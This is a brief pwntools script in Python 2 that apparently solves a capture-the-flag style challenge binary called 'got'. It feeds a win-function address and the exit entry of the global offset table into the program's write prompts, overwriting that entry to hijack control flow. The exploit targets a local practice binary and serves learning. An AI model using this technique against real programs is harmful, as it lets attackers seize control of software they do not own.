from pwn import *

exit_got_addr = "0x04033c0"
win_addr = "4198806"

p = process("./got")

p.recvuntil("what?\n")
p.sendline(win_addr)
p.recvuntil("where?\n")
p.sendline(exit_got_addr)
print p.recvline()

p.close()